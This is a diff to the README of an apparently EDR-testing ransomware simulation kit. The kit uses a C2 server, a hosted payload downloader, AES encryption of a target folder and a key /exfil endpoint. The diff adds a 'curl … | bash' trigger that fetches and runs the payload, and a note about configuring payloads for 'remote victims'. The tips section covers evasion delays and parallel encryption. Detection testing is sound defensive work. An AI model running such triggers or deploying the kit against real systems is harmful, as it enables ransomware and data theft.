@@ -56,9 +56,10 @@ chmod +x setup.sh && sudo ./setup.sh
 **Example output**
 
 ```
-C2 ready: http://192.168.1.100:8080
-Payload URL: http://192.168.1.100:8000/payload_downloader.sh
-Test files: /tmp/test_victim (200 items)
+C2 running at http://192.168.1.100:8080
+Payload URL for curl: http://192.168.1.100:8000/payload_downloader.sh
+Test trigger: curl -s http://192.168.1.100:8000/payload_downloader.sh | bash
+Victim run will populate /tmp/test_victim (200 items)
 ```
 
 **Trigger on victim (non-root for maximum EDR visibility)**
@@ -110,7 +111,7 @@ pkill -f c2_server.py
 
 ## Customization tips
 
-- **Environment configuration:** update `.env` (or provide `ENV_FILE_PATH=/path/to/file`) to set `C2_URL`, `TARGET_DIR`, and the encrypted file suffix without editing scripts.
+- **Environment configuration:** update `.env` (or provide `ENV_FILE_PATH=/path/to/file`) to set `C2_URL`, `TARGET_DIR`, and the encrypted file suffix without editing scripts. Running `setup.sh` now renders these values directly into the hosted payload so remote victims inherit your configuration automatically.
 - **Cipher suite:** change the `openssl enc -aes-256-*` invocation.
 - **Evasion delays:** insert `sleep $((RANDOM % 10))` or similar pauses.
 - **Parallelization:** leverage `xargs -P 8 -I {} …` for multi-threaded encryption.
@@ -126,6 +127,7 @@ pkill -f c2_server.py
 | No SentinelOne alert | Run as **non-root** and ensure “Deep Visibility” + “Ransomware” policies are enabled. |
 | Decrypt fails        | Use the key and IV from the **same run** (check the C2 `/exfil` endpoint or ransom note). |
 | Python missing       | `sudo dnf install python3 python3-pip && pip3 install flask` |
+| Flask install fails  | Use the pinned dependency (`flask==2.0.3`) included in `requirements.txt`; some offline mirrors do not host newer Flask builds yet. |
 
 ---
 
